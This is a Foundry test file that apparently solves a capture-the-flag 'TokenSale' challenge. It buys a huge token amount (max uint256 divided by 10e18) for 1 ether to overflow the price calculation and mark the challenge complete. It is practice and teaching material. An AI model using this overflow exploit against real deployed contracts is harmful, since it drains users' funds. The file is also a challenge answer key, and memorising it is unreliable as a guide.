// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";


// 1 ether = 10**18 wei 
// MAX_UINT256 = (2**256 - 1)
// PRICE_MAX = (2**256 -1)/10**18

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;
    address player = vm.addr(0x1);

    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 4 ether);
        vm.deal(player, 10 ether);
    }

    function testIncrement() public {
        vm.startPrank(address(player));
        uint256 numTokens = type(uint256).max / 10e18; 
        tokenSale.buy{value: 1 ether}(numTokens);
        _checkSolved();

    }

    function _checkSolved() internal {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
